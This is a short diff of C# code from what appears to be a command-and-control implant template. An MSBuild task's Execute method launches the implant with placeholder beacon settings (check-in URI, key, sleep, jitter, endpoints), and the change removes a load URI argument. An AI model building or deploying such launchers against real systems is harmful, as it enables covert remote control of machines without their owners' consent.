@@ -38,7 +38,7 @@
     {
         public override bool Execute()
         {
-            Program.Main(new string[] {"{{ check_in_uri }}", "{{ key }}", "{{ sleep }}", "{{ jitter }}", "{{ endpoints }}", "{{ load_uri }}"});
+            Program.Main(new string[] {"{{ check_in_uri }}", "{{ key }}", "{{ sleep }}", "{{ jitter }}", "{{ endpoints }}"});
             return true;
         }
     }
